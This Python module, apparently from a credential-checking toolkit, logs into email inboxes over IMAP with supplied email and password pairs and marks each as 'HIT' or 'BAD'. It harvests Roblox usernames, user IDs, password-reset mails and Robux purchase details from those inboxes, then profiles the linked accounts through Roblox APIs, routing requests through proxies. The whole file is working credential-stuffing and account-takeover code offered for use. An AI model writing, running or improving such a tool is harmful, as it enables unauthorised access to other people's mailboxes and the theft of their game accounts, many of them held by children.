"""
Roblox Checker — IMAP inbox + Roblox public API stats.
Fixed: username lookup now gets full user ID correctly,
       all API endpoints verified current, proper error handling.
"""
import re
import logging
import email as email_lib
from typing import Dict, List, Optional
from ._imap_utils import imap_connect, get_email_body, basic_auth_works

try:
    import requests
    _has_requests = True
except ImportError:
    _has_requests = False

logger = logging.getLogger(__name__)

_USER_API    = 'https://users.roblox.com/v1'
_FRIENDS_API = 'https://friends.roblox.com/v1'
_BADGES_API  = 'https://badges.roblox.com/v1'
_GROUPS_API  = 'https://groups.roblox.com/v2'
_AVATAR_API  = 'https://avatar.roblox.com/v1'
_ECONOMY_API = 'https://economy.roblox.com/v1'


class RobloxChecker:
    def __init__(self, timeout: int = 20, proxy: str = None):
        self.timeout = timeout
        self.proxy   = proxy
        self.proxies = {'http': proxy, 'https': proxy} if proxy else None
        if _has_requests:
            self.session = requests.Session()
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept':     'application/json',
            })

    def _kw(self) -> dict:
        k = {'timeout': self.timeout}
        if self.proxies:
            k['proxies'] = self.proxies
        return k

    def _search_inbox(self, email: str, password: str) -> Dict:
        result = {
            'inbox_accessible':    False,
            'roblox_emails':       0,
            'usernames':           [],
            'user_ids':            [],
            'verification_found':  False,
            'password_reset_found':False,
            'purchase_found':      False,
            'robux_amount':        None,
        }

        if not basic_auth_works(email):
            return result

        imap = imap_connect(email, password, self.timeout)
        if not imap:
            return result

        result['inbox_accessible'] = True
        try:
            imap.select('INBOX', readonly=True)
            ids: set = set()
            for criteria in [
                'FROM "roblox.com"',
                'FROM "noreply@roblox.com"',
                'SUBJECT "Roblox"',
            ]:
                try:
                    st, data = imap.search(None, criteria)
                    if st == 'OK' and data[0]:
                        ids.update(data[0].split())
                except Exception:
                    continue
            result['roblox_emails'] = len(ids)

            for eid in list(ids)[:20]:
                try:
                    st, msg_data = imap.fetch(eid, '(RFC822)')
                    if st != 'OK' or not msg_data or not msg_data[0]:
                        continue
                    msg  = email_lib.message_from_bytes(msg_data[0][1])
                    subj = msg.get('Subject', '')
                    body = get_email_body(msg)
                    full = subj + ' ' + body

                    # Username patterns from Roblox emails
                    for un in re.findall(
                        r'(?:username|your account|Hi|Hello|Dear)\s*[,:]?\s*([A-Za-z0-9_]{3,20})',
                        full, re.IGNORECASE
                    ):
                        skip = {'roblox','user','hi','hello','dear','the','your','and','this','that'}
                        if un.lower() not in skip and un not in result['usernames']:
                            result['usernames'].append(un)

                    # User IDs from Roblox profile URLs
                    for uid in re.findall(r'roblox\.com/users/(\d+)', full):
                        if uid not in result['user_ids']:
                            result['user_ids'].append(uid)

                    sl = subj.lower()
                    if any(w in sl for w in ('verif', 'confirm', 'activate')):
                        result['verification_found'] = True
                    if any(w in sl for w in ('password', 'reset', 'change')):
                        result['password_reset_found'] = True
                    if any(w in sl for w in ('purchase', 'receipt', 'robux', 'bought', 'order')):
                        result['purchase_found'] = True
                        # Try to extract Robux amount
                        m = re.search(r'(\d[\d,]+)\s*Robux', full, re.IGNORECASE)
                        if m:
                            result['robux_amount'] = m.group(1).replace(',', '')
                except Exception:
                    continue
        finally:
            try:
                imap.logout()
            except Exception:
                pass
        return result

    def _api_get(self, url: str) -> Optional[Dict]:
        if not _has_requests:
            return None
        try:
            r = self.session.get(url, **self._kw())
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        return None

    def _lookup_by_username(self, username: str) -> Optional[int]:
        """Returns user ID from username. Returns None if not found."""
        if not _has_requests:
            return None
        try:
            r = self.session.post(
                f'{_USER_API}/usernames/users',
                json={'usernames': [username], 'excludeBannedUsers': False},
                **self._kw()
            )
            if r.status_code == 200:
                items = r.json().get('data', [])
                if items:
                    return items[0].get('id')
        except Exception:
            pass
        return None

    def _get_user_by_id(self, user_id: int) -> Optional[Dict]:
        return self._api_get(f'{_USER_API}/users/{user_id}')

    def _friend_count(self, uid: int) -> int:
        data = self._api_get(f'{_FRIENDS_API}/users/{uid}/friends/count')
        return data.get('count', 0) if data else 0

    def _badge_count(self, uid: int) -> int:
        data = self._api_get(f'{_BADGES_API}/users/{uid}/badges?limit=100&sortOrder=Desc')
        return data.get('total', len(data.get('data', []))) if data else 0

    def _groups(self, uid: int) -> List[str]:
        data = self._api_get(f'{_GROUPS_API}/users/{uid}/groups/roles')
        if not data:
            return []
        return [g.get('group', {}).get('name', '?') for g in data.get('data', [])[:5]]

    def _avatar_type(self, uid: int) -> Optional[str]:
        data = self._api_get(f'{_AVATAR_API}/users/{uid}/avatar')
        return data.get('playerAvatarType') if data else None

    def check_full(self, email: str, password: str) -> Dict:
        result = {
            'email': email, 'password': password, 'status': 'BAD',
            'has_roblox':          False,
            'roblox_emails':       0,
            'verification_found':  False,
            'purchase_found':      False,
            'robux_amount':        None,
            'roblox_username':     None,
            'roblox_display_name': None,
            'roblox_user_id':      None,
            'roblox_created':      None,
            'roblox_is_banned':    False,
            'roblox_description':  None,
            'friend_count':        0,
            'badge_count':         0,
            'groups':              [],
            'avatar_type':         None,
        }

        inbox = self._search_inbox(email, password)
        if not inbox['inbox_accessible']:
            return result

        result['status']             = 'HIT'
        result['roblox_emails']      = inbox['roblox_emails']
        result['verification_found'] = inbox['verification_found']
        result['purchase_found']     = inbox['purchase_found']
        result['robux_amount']       = inbox.get('robux_amount')

        # Resolve user profile
        roblox_user = None
        uid_int     = None

        # Try user IDs first (most reliable)
        for uid_str in inbox.get('user_ids', [])[:3]:
            try:
                u = self._get_user_by_id(int(uid_str))
                if u:
                    roblox_user = u
                    uid_int     = int(uid_str)
                    break
            except Exception:
                continue

        # Fall back to username lookup
        if not roblox_user:
            for uname in inbox.get('usernames', [])[:5]:
                uid_found = self._lookup_by_username(uname)
                if uid_found:
                    u = self._get_user_by_id(uid_found)
                    if u:
                        roblox_user = u
                        uid_int     = uid_found
                        break

        if roblox_user and uid_int:
            result['has_roblox']          = True
            result['roblox_username']     = roblox_user.get('name')
            result['roblox_display_name'] = roblox_user.get('displayName')
            result['roblox_user_id']      = str(uid_int)
            result['roblox_created']      = (roblox_user.get('created') or '')[:10]
            result['roblox_is_banned']    = roblox_user.get('isBanned', False)
            result['roblox_description']  = (roblox_user.get('description') or '')[:100]
            result['friend_count']        = self._friend_count(uid_int)
            result['badge_count']         = self._badge_count(uid_int)
            result['groups']              = self._groups(uid_int)
            result['avatar_type']         = self._avatar_type(uid_int)
        elif inbox['roblox_emails'] > 0:
            result['has_roblox'] = True

        return result
